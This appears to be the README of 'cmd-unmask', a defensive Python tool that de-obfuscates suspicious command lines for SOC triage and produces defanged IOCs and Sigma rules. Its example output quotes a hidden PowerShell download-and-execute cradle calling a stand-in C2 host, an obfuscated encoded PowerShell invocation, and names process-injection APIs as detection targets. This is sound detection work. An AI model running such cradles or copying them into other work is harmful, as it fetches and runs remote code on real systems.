<div align="center">

# cmd-unmask

**Static Command-Line De-Obfuscation & Behavioral Triage Tracer Script**

[![Python 3.10+ stdlib-only](https://img.shields.io/badge/python-3.10%2B%20stdlib--only-blue.svg)](#)
[![Dependencies: Zero](https://img.shields.io/badge/dependencies-zero-009688.svg)](#)
[![Tests](https://img.shields.io/badge/tests-160%20passed-success.svg)](#)
[![FPR: 0.0000](https://img.shields.io/badge/FPR-0.0000%20(71%20fixtures)-brightgreen.svg)](#)

[Quickstart](#quickstart) · [Architecture](#architecture) · [Detection Rigidity](#detection-rigidity) · [CLI Reference](#cli-reference) · [ADRs](docs/adr/README.md)

</div>

During live Tier-1/Tier-2 SOC triage, analysts lose minutes manually decoding nested Base64, Gzip, caret-escaped `cmd.exe`, and PowerShell expressions while avoiding local EDR CLI inspection blocks. `cmd-unmask` statically peels multi-layer obfuscation, extracts behavioral capabilities and defanged IOCs, explains every `BENIGN` or malicious verdict, and synthesizes ready-to-paste offense notes and Sigma YAML rules in sub-millisecond latency—using 100% Python standard library with zero external dependencies and zero code execution.

---

<a id="architecture"></a>
## Architecture Pipeline

```text
  [ Clipboard / Stdin / SIEM JSON / File / CLI ]
                        |
                        v
             +---------------------+
             |  Ingestion Pipeline |  Auto-SIEM JSON/JSONL, quote unwrapping,
             +---------------------+  Event ID 4688 / Sysmon EID 1 lineage
                        |
                        v
             +---------------------+
             |    Unpacking DAG    |  Two-pass normalizer, expression resolver,
             +---------------------+  UTF-16LE Base64, Gzip/Deflate, Hex/URL/XOR
                        |             (bounded: depth<=10, nodes<=64, 256KB, 3.0s)
                        v
             +---------------------+
             | Classifier & VA     |  MITRE ATT&CK rules, Spawn Matrix, staging
             | Rigidity            |  paths, Authorized VA Audit Baseline suppression
             +---------------------+
                        |
                        v
             +---------------------+
             | Capability & IOC    |  File writes, Win32/.NET P/Invoke, registry,
             | Extractor           |  defanged IOCs, explicit Verdict Rationale
             +---------------------+
                        |
                        v
             +---------------------+
             | Ticket Note & Sigma |  Deduplicated timeline, --full truncation,
             +---------------------+  auto-copied [SOC TRIAGE NOTE], Sigma YAML
```

---

<a id="quickstart"></a>
## Live Shift Quickstart

### Installation

```bash
git clone https://github.com/VelkaRepo/cmd-unmask.git
cd cmd-unmask
pip install -e .
```

### Zero-Flag & Tactical Workflows

```bash
# 1. Zero-flag clipboard triage (auto-detects raw commands or SIEM JSON/JSONL;
#    pass --copy-note to copy [SOC TRIAGE NOTE] or --sigma to emit Sigma YAML)
cmd-unmask

# 2. Positional auto-detect (file path -> batch SIEM ingestion; string -> single command)
cmd-unmask alerts.jsonl --format jsonl > triaged.jsonl
cmd-unmask "p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgA..."

# 3. Inspect complete multi-line scripts without head/tail truncation
cmd-unmask --full

# 4. Supply parent-child process lineage (Event ID 4688 / Sysmon EID 1)
cmd-unmask -c "cmd.exe /c whoami" --parent "C:\Windows\System32\inetsrv\w3wp.exe" --sigma

# 5. Run Regression Corpus benchmark & Detection Rigidity Gate (row-by-row)
cmd-unmask --benchmark -v
```

### Example Output (`--format pretty --no-color`)

```text
+----------------------------------------------------------------------------+
| CMD-UNMASK [cli] | HIGH (70/100)                                           |
+----------------------------------------------------------------------------+
| Suspicious powershell activity (HIGH 70/100) targeting                     |
| http://c2.evil.example:8080/stage.ps1. Key flag: -NoP / -NoProfile.        |
+----------------------------------------------------------------------------+

[1] UNMASKED COMMAND (Unobfuscated)
  powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')

[2] THREAT BREAKDOWN
  - T1059.001 Execution            PowerShell Suspicious Execution / Cradle (-W Hidden)
  - T1105     Command and Control  Ingress Tool Transfer / Remote Download Cradle (Net.WebClient)
  - [CAPABILITY] Network: DownloadString

[3] DEFANGED IOCs
  - URL    hxxp://c2[.]evil[.]example[:]8080/stage.ps1
  - DOMAIN c2[.]evil[.]example

[4] NEXT STEPS
  1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
```

---

<a id="detection-rigidity"></a>
## Detection Coverage & False-Positive Rigidity

Validated against 71 labeled corpus fixtures (`37` malicious, `34` benign enterprise commands) with `Precision=1.0000`, `Recall=1.0000`, `FPR=0.0000`, and `p50 < 1ms` per command.

| Mechanism | Threat / Operational Coverage | False-Positive Rigidity |
| :--- | :--- | :--- |
| **Obfuscation Unpacking** | `cmd.exe` carets/env-slices, PS backticks/`-f`/`[char]`/`[char[]]@(...) -join`/`$var` 4104 symbol-table reconstruction, UTF-16LE Base64, Gzip/Deflate, Hex/URL/XOR | Entropy + printable-ratio gates; `@' ... '@` & `'...'` literals preserved; automatic vars (`$env:*`, `$_`) untouched; 256 KB stream ceiling |
| **Process Lineage & Staging** | Office (`WINWORD.EXE`), web server (`w3wp.exe`), WMI (`WmiPrvSE.exe`) spawn matrix; `\Users\Public\`, `\AppData\Local\Temp\`, `/dev/shm/` staging | Canonical OS/admin parents (`explorer.exe -> cmd.exe`, `services.exe -> svchost.exe`) and `Program Files` paths never trigger |
| **Win32 P/Invoke vs. VA Audit** | Flags offensive memory-injection APIs (`VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`, `OpenProcess` — `T1055`) | **Authorized Audit Baseline** recognizes read-only Nessus/VA `Netapi32.dll` (`NetGetJoinInformation`, `NetApiBufferFree`) checks as `BENIGN (0/100)` |
| **Contextual IOC Extraction** | URLs, domains, IPv4/IPv6, file paths, MD5/SHA1/SHA256, and cloud metadata SSRF (`169.254.169.254`) | Suppresses `.NET` namespaces (`Net.WebClient`), hex blobs, and link-local-only metadata queries from `T1105` escalation |
| **Analyst Clarity & Sigma** | Non-IOC capabilities, explicit `Verdict Rationale`, `[ANALYST EXECUTIVE BRIEF]`, `[RECOMMENDED L1/L2 NEXT STEPS]`, and vendor-neutral Sigma YAML | Machine formats (`json`, `jsonl`) remain strictly pure; smart head/tail truncation avoids terminal flooding (`--full` overrides) |
| **Domain Knowledge & Masquerading** | Static 46-LOLBin/flag catalog, RFC1918 vs. metadata vs. external network classification, and `T1036.005` binary masquerading | Canonical OS directories (`System32`, `SysWOW64`, `/usr/bin`) and bare binary names never trigger masquerading |

---

<a id="cli-reference"></a>
## Grouped CLI Reference

Matches `python -m cmd_unmask --help`:

### Common Triage
| Flag | Argument | Description | Default |
| :--- | :--- | :--- | :--- |
| `target` | — | Optional file path or raw command string (auto-detected) | `None` |
| `-c`, `--cmd` | `CMD` | Single obfuscated command string to unmask | `None` |
| `-f`, `--file` | `FILE` | Path to raw text, JSON, or JSONL input file | `None` |
| `-p`, `--paste` | — | Read obfuscated command directly from the OS clipboard | `False` |
| `--full` | — | Print complete multi-line unmasked payloads without head/tail truncation | `False` |
| `--no-copy` | — | Disable automatic clipboard copy of SOC Ticket Note on interactive runs | `False` |
| `--no-sigma` | — | Disable automatic Sigma YAML output on non-benign interactive runs | `False` |

### Output & Detection
| Flag | Argument | Description | Default |
| :--- | :--- | :--- | :--- |
| `--format` | `CHOICE` | Output format (`pretty`, `markdown`, `json`, `jsonl`) | `pretty` |
| `--no-color` | — | Disable ANSI colors in pretty terminal output | `False` |
| `--copy-note` | — | Copy the Ready-to-Paste SOC Ticket Note to the OS clipboard | `False` |
| `--show-note` | — | Print the full borderless `[SOC TRIAGE NOTE]` block to stdout in pretty mode | `False` |
| `--no-defang` | — | Emit raw IOCs instead of defanged IOCs | `False` |
| `--sigma` | — | Synthesize and print Sigma YAML rule(s) to stdout for non-benign findings | `False` |
| `--sigma-out` | `SIGMA_OUT` | Write synthesized Sigma YAML rule(s) to a file or directory path | `None` |
| `--parent` | `PARENT` | Optional parent process image/name for single or clipboard triage | `None` |
| `--parent-cmd` | `PARENT_CMD` | Optional parent process command line for single or clipboard triage | `None` |
| `--image` | `IMAGE` | Optional target process image path for single or clipboard triage | `None` |

### Benchmark & Advanced
| Flag | Argument | Description | Default |
| :--- | :--- | :--- | :--- |
| `--field` | `FIELD` | Custom JSON field name containing the command line | Auto-detect |
| `--max-depth` | `MAX_DEPTH` | Maximum Unpacking DAG depth | `10` |
| `--timeout` | `TIMEOUT` | Per-command unpacking timeout in seconds | `3.0` |
| `--fail-on` | `SEV` | Exit code 2 if severity meets or exceeds `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` (or `UNKNOWN`) | `None` |
| `--benchmark` | `[PATH]` | Run Regression Corpus benchmark against built-in corpus or custom file | `None` |
| `--corpus-dir` | `DIR` | Load `benign.jsonl` and `malicious.jsonl` from a custom corpus directory | `None` |
| `--max-fpr` | `MAX_FPR` | Maximum allowed False Positive rate for Detection Rigidity Gate | `0.0` |
| `-v`, `--verbose` | — | Print row-by-row fixture results in `--benchmark` summary output | `False` |

---

## Architecture Decision Records & Domain Docs

- **ADR Index**: [`docs/adr/README.md`](docs/adr/README.md) (`ADR-0001` through `ADR-0014`)
- **Architecture Diagrams**: [`docs/architecture.md`](docs/architecture.md)
- **Ubiquitous Language**: [`GLOSSARY.md`](GLOSSARY.md)

---

## Verification, Limitations & Security

### Development & Testing

```bash
# Run full unit and integration test suite (160 tests)
python -m unittest discover -s tests -v

# Run Regression Corpus benchmark and Detection Rigidity Gate
python -m cmd_unmask --benchmark --no-color
```

### Security & Limitations
- **100% Static Analysis**: `cmd-unmask` never executes untrusted code, spawns child shells, or calls `eval()`/`exec()`. Runtime-only payloads requiring live C2 responses or active interpreter state cannot be resolved statically ([ADR-0001](docs/adr/0001-static-stdlib-only-analysis.md)).
- **Bounded Resource Ceilings**: Unpacking enforces `max_depth=10`, `max_nodes=64`, `max_stream_bytes=262,144` (256 KB), and `timeout=3.0s` ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)).
- **Single-Byte XOR Only**: Heuristic XOR brute-force is limited to single-byte keys (`0x01`–`0xFF`) gated by entropy and anchor checks.
